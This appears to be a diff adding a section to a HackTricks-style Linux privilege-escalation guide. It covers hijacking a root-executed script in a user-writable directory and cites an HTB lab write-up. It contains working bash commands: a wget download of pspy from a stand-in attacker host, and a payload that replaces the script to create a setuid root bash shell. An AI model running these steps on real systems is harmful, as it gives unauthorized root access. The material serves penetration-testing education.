@@ -60,6 +60,38 @@ Name=Evil Desktop Entry
 
 For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.
 
+### Root executing user-writable scripts/binaries
+
+If a privileged workflow runs something like `/bin/sh /home/username/.../script` (or any binary inside a directory owned by an unprivileged user), you can hijack it:
+
+- **Detect the execution:** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) to catch root invoking user-controlled paths:
+
+```bash
+wget http://attacker/pspy64 -O /dev/shm/pspy64
+chmod +x /dev/shm/pspy64
+/dev/shm/pspy64   # wait for root commands pointing to your writable path
+```
+
+- **Confirm writeability:** ensure both the target file and its directory are owned/writable by your user.
+- **Hijack the target:** backup the original binary/script and drop a payload that creates a SUID shell (or any other root action), then restore permissions:
+
+```bash
+mv server-command server-command.bk
+cat > server-command <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell
+chown root:root /tmp/rootshell
+chmod 6777 /tmp/rootshell
+EOF
+chmod +x server-command
+```
+
+- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). When root re-executes the hijacked path, grab the escalated shell with `./rootshell -p`.
+
+## References
+
+- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
+
 {{#include ../../banners/hacktricks-training.md}}
 
 
